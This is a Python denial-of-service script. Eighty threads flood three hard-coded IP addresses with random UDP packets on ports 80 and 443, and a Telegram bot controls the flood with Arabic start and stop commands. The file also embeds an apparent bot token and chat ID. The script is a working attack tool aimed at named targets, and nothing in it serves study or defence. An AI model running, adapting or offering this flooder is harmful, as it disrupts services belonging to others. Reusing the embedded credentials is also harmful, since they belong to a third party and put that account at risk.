import socket, random, threading, time, requests

TOKEN = "8603678400:AAHHOLE8XWV7XVWNE_nyuTG4NP1_FjBSvXA"
ID = "8343706519"
TARGETS = ["109.224.80.6", "37.239.25.115", "192.168.0.1"]
STATUS = "STOPPED"

def telegram(msg):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={'chat_id': ID, 'text': msg}, timeout=10)
    except: pass

def cloud_sniper():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if STATUS == "RUNNING":
            try:
                for ip in TARGETS:
                    payload = random._urandom(1024)
                    sock.sendto(payload, (ip, 80))
                    sock.sendto(payload, (ip, 443))
                time.sleep(0.01)
            except: pass
        else: time.sleep(1)

def cloud_controller():
    global STATUS
    last_id = 0
    telegram("🛰️ MONITOR CLOUD: ONLINE")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_id+1}&timeout=30"
            res = requests.get(url).json()
            for up in res.get("result", []):
                last_id = up["update_id"]
                msg = up.get("message", {}).get("text", "").strip()
                if msg == "اشتغل":
                    STATUS = "RUNNING"
                    telegram("🔥 بدأ الخنق العميق..")
                elif msg == "توقف":
                    STATUS = "STOPPED"
                    telegram("🛑 تم التوقف.")
        except: time.sleep(5)

if __name__ == "__main__":
    for _ in range(80):
        threading.Thread(target=cloud_sniper, daemon=True).start()
    cloud_controller()
